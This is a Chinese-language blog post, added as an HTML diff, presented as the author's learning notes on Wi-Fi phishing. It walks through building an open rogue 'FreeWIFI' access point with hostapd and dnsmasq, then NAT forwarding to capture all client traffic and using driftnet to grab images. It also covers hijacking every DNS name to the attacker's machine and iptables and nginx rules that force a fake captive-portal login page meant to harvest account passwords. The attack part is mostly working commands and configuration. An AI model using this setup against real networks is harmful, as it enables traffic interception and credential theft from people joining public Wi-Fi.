@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"likesoso.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="到这一章，我们的基础学习就已经结束了，学到了一些802.11的原理知识,以及kali下的基础操作。接下来进入正题。不难发现之前的操作，只能做一些拒绝服务攻击，或者是靠字典的强大，爆破出wifi密码，从而连接到目标网络内。接下来记录一下我的wifi钓鱼学习笔记。 安装环境 一个支持AP模式的无线网卡，这里我推荐TP-LINK的TL-WN722N Ver1.0，咸鱼30rmb购得。推荐ver1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近源渗透(4)">
+<meta property="og:url" content="http://likesoso.github.io/posts/e40f6a81/index.html">
+<meta property="og:site_name" content="likesoso - 随便写写">
+<meta property="og:description" content="到这一章，我们的基础学习就已经结束了，学到了一些802.11的原理知识,以及kali下的基础操作。接下来进入正题。不难发现之前的操作，只能做一些拒绝服务攻击，或者是靠字典的强大，爆破出wifi密码，从而连接到目标网络内。接下来记录一下我的wifi钓鱼学习笔记。 安装环境 一个支持AP模式的无线网卡，这里我推荐TP-LINK的TL-WN722N Ver1.0，咸鱼30rmb购得。推荐ver1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://likesoso.github.io/posts/e40f6a81/4-1.jpg">
+<meta property="og:image" content="http://likesoso.github.io/posts/e40f6a81/4-2.jpg">
+<meta property="og:image" content="http://likesoso.github.io/posts/e40f6a81/4-3.jpg">
+<meta property="og:image" content="http://likesoso.github.io/posts/e40f6a81/4-4.jpg">
+<meta property="article:published_time" content="2020-09-03T09:28:22.000Z">
+<meta property="article:modified_time" content="2020-10-12T08:16:49.169Z">
+<meta property="article:author" content="likesoso">
+<meta property="article:tag" content="wifi">
+<meta property="article:tag" content="近源渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://likesoso.github.io/posts/e40f6a81/4-1.jpg">
+
+<link rel="canonical" href="http://likesoso.github.io/posts/e40f6a81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>近源渗透(4) | likesoso - 随便写写</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">likesoso - 随便写写</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/likesoso" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://likesoso.github.io/posts/e40f6a81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/likesoso.png">
+      <meta itemprop="name" content="likesoso">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="likesoso - 随便写写">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          近源渗透(4)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-09-03 17:28:22" itemprop="dateCreated datePublished" datetime="2020-09-03T17:28:22+08:00">2020-09-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-12 16:16:49" itemprop="dateModified" datetime="2020-10-12T16:16:49+08:00">2020-10-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">近源渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>    到这一章，我们的基础学习就已经结束了，学到了一些802.11的原理知识,以及kali下的基础操作。接下来进入正题。不难发现之前的操作，只能做一些拒绝服务攻击，或者是靠字典的强大，爆破出wifi密码，从而连接到目标网络内。接下来记录一下我的wifi钓鱼学习笔记。</p>
+<h1 id="安装环境">安装环境</h1>
+<p>一个支持AP模式的无线网卡，这里我推荐TP-LINK的TL-WN722N Ver1.0，咸鱼30rmb购得。推荐ver1版本的，ver2的kali没得自带的驱动。</p>
+<p><img src="/posts/e40f6a81/4-1.jpg"></p>
+<p><strong>安装hostapd、dnsmasq、php等</strong></p>
+<a id="more"></a>
+<h2 id="hostpad">hostpad</h2>
+<p>实现了热点的建立，管理等功能</p>
+<p>首先创建一个open.conf作为热点的配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface&#x3D;wlan0</span><br><span class="line">ssid&#x3D;FreeWIFI</span><br><span class="line">driver&#x3D;nl80211</span><br><span class="line">channel&#x3D;1</span><br><span class="line">hw_mode&#x3D;g</span><br></pre></td></tr></table></figure>
+<h2 id="dnsmasq">dnsmasq</h2>
+<p>提供DNS和DHCP服务的简易轻量级配置工具</p>
+<p>向/etc/dnsmasq.conf添加一条：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhcp-range&#x3D;172.5.5.100, 172.5.5.250, 12h</span><br><span class="line">interface&#x3D;wlan0</span><br></pre></td></tr></table></figure>
+<p>重启服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>
+<p>运行以下命令，消除系统对网卡的影响 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmcli radio wifi off #表示关闭wifi</span><br><span class="line">rfkill unblock wlan #解锁无线网卡</span><br><span class="line">ifconfig wlan0 172.5.5.1&#x2F;24</span><br><span class="line">hostapd open.conf #开启wifi</span><br></pre></td></tr></table></figure> 效果如下：</p>
+<p><img src="/posts/e40f6a81/4-2.jpg"></p>
+<p>此时SSID为Freewifi的无密码wifi已经开启，但是这个wifi不能上网，我们还需要将wlan0转发到能出网的eth0上面</p>
+<p>运行<code>ifconfig</code>查看外网网卡为eth0</p>
+<p><img src="/posts/e40f6a81/4-3.jpg"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>开启ip路由转发功能，这个是临时配置，修改/etc/systcl.conf 可以永久更改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE #转发</span><br></pre></td></tr></table></figure>
+<p>这时钓鱼wifi已经可以连接到互联网了，用wireshark等抓包工具对eth0进行抓包。即可抓到连接wifi的客户端的所有流量。</p>
+<h1 id="driftnet">driftnet</h1>
+<p>简单的图片捕获工具</p>
+<p>kali安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet</span><br><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
+<p>经过测试，成功率不是很高。很多图片都抓不到</p>
+<h1 id="dns-劫持">DNS 劫持</h1>
+<p>在本地部署钓鱼网站，无线客户端连接网络时，通过DHCP服务不仅能获得本地的ip地址，还包括DHCP服务指定的DNS解析地址。</p>
+<p>先在本地搭建钓鱼网站，以flash为例子：</p>
+<p>通过对DNS服务器进行配置，打开/etc/dnsmasq.conf，添加格式：address=/url/ip</p>
+<p>添加一条：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;&#x2F;#&#x2F;172.5.5.1</span><br><span class="line">#在url处填#，将解析所有的地址</span><br></pre></td></tr></table></figure>
+<p>重启dnsmasq即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dnsmasq</span><br></pre></td></tr></table></figure>
+<p>之后连接上wifi之后就可以完成劫持了</p>
+<h1 id="配置captive-protal">配置Captive Protal</h1>
+<p>连接上免费的wifi后，要求认证。以此方式欺骗得到账号密码。</p>
+<p>以android设备为例子，当设备接入无线网络时，会尝试请求访问client3.google.com/generate_204并根据返回结果来判断网络状况，返回204则表示网络正常，<strong>返回302则表示存在认证</strong>，并以弹窗的方式显示在手机中。</p>
+<p><strong>1.配置iptables</strong></p>
+<p>将所有的流量包丢弃，但是允许DNS查询，及向网关特定端口请求（172.5.5.1的80端口）；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p udp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 80 -d 172.5.5.1 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -j DROP</span><br></pre></td></tr></table></figure>
+<p>将来自nat网络对80端口的请求全部转发到172.5.5.1:80</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 172.5.5.1:80</span><br></pre></td></tr></table></figure>
+<p>来自nat的dns请求都转发到172.5.5.1的53端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br></pre></td></tr></table></figure>
+<p>以上配置后，android连接到FreeWifi后，请求client3.google.com/generate_204，会被转发到172.5.5.1:80</p>
+<p><strong>安装php7.4-fpm</strong> 执行安装命令并启动服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install php7.4-fpm</span><br><span class="line">systemctl start pap7.4-fpm</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p><strong>配置nginx</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html;  &#x2F;&#x2F;网站根目录</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                if (!-e $request_filename) &#123;</span><br><span class="line">                         rewrite ^&#x2F;(.*)$ &#x2F;index.html redirect;  &#x2F;&#x2F;访问不存在的页面会302到主页面</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        location ~ \.php$ &#123;		&#x2F;&#x2F;支持php</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时连接上wifi，会自动弹出认证界面。接下来就是自己搭建钓鱼页面然后去试试了。 <img src="/posts/e40f6a81/4-4.jpg"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>likesoso
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://likesoso.github.io/posts/e40f6a81/" title="近源渗透(4)">http://likesoso.github.io/posts/e40f6a81/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wifi/" rel="tag"># wifi</a>
+              <a href="/tags/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F/" rel="tag"># 近源渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/ab4efc46/" rel="prev" title="近源渗透(3)">
+      <i class="fa fa-chevron-left"></i> 近源渗透(3)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/f9e0b1be/" rel="next" title="sqli-labs教程(2)">
+      sqli-labs教程(2) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">安装环境</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hostpad"><span class="nav-number">1.1.</span> <span class="nav-text">hostpad</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnsmasq"><span class="nav-number">1.2.</span> <span class="nav-text">dnsmasq</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#driftnet"><span class="nav-number">2.</span> <span class="nav-text">driftnet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dns-%E5%8A%AB%E6%8C%81"><span class="nav-number">3.</span> <span class="nav-text">DNS 劫持</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEcaptive-protal"><span class="nav-number">4.</span> <span class="nav-text">配置Captive Protal</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="likesoso" src="/images/likesoso.png">
+  <p class="site-author-name" itemprop="name">likesoso</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">likesoso</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+   <canvas class="love" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/love.js"></script>
+
+</body>
+</html>
